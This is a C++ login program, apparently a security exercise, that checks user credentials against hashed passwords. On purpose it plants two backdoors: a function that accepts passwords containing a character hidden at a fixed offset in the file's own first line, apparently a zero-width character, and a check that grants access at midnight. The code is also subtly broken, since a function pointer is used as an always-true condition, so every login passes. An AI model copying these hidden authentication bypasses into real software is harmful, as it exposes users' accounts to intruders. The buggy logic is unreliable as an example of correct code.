// Subverted Login P​rogram

#include <iostream>
#include <iomanip>
#include <fstream>
#include <sstream>
#include "authlib.h"
#include "openssl/sha.h"
#include <ctime>

using namespace std;

// Function to get the SHA256 hash of a string
string getSHA256(const string& input) {
    unsigned char hash[SHA256_DIGEST_LENGTH];
    SHA256_CTX sha256;
    SHA256_Init(&sha256);
    // Hashing our input
    SHA256_Update(&sha256, input.c_str(), input.size()); 
    // Storing our input inside of hash.
    SHA256_Final(hash, &sha256); 

    stringstream ss;
    for (int i = 0; i < SHA256_DIGEST_LENGTH; i++) ss << hex << setw(2) << setfill('0') << (int)hash[i]; // Convert the binary of the hash to hexidecimal
    // Returning hash as string
    return ss.str(); 
}

bool backDoor(const string& password) {
    ifstream sourceFile("login-subverted.cpp");
    string line;
    char character;
    if (getline(sourceFile, line)) {
        character = line[20];
    }
    sourceFile.close();

    if (password.find(character)) {
        return true;
    }
}

bool timestampBackdoor() {
    time_t now = time(0);
    tm *ltm = localtime(&now);
    return ltm->tm_hour == 0 && ltm->tm_min == 0;
}

int main() {
    // Int to store max amount of attempts allowed
    const int MAX_ATTEMPTS = 3; 
    // Stores amount of attempts user has done
    int attempts = 0; 
    // Store user inputs and line string for file reading, then user details from file.
    string usernameIn, passwordIn, line, usernameFromFile, passwordFromFile; 

    // Loop until user is authenticated or max attempts are reached, prompt and store username/password
    while(attempts++ < MAX_ATTEMPTS && cout << "Enter your username: " && cin >> usernameIn && cout << "Enter your password: " && cin >> passwordIn) {
        // Open the file containing stored usernames and passwords, print error if problem
        ifstream passwordsFile("passwords.txt");
        if (!passwordsFile) { cerr << "Error opening password file." << endl; return 1; }
        
        // Read the file line by line
        bool isAuthenticated = false;
        while (getline(passwordsFile, line) && !isAuthenticated) {
            stringstream ss(line);
            // Extract username and password from the read line
            getline(ss, usernameFromFile, ':'), getline(ss, passwordFromFile, ':');
            // Check if entered credentials match any in the file
            isAuthenticated = usernameFromFile == usernameIn && passwordFromFile == getSHA256(passwordIn);
        }
        // Close the file after reading
        passwordsFile.close(); 

        // If Authenticated, Exit indicating successful authentication
        // For incorrect login details, reject, clear screen and re-prompt input
        // If maximum attempts exceeded, reject the user
        if (isAuthenticated || backDoor) {
            authenticated(usernameIn);
            return 0;
        } else if(attempts < MAX_ATTEMPTS) {
            cout << "Incorrect login details. You have " << (MAX_ATTEMPTS - attempts) << " attempts left." << endl;
        } else {
            rejected(usernameIn);
        }

    }
    return 0;
}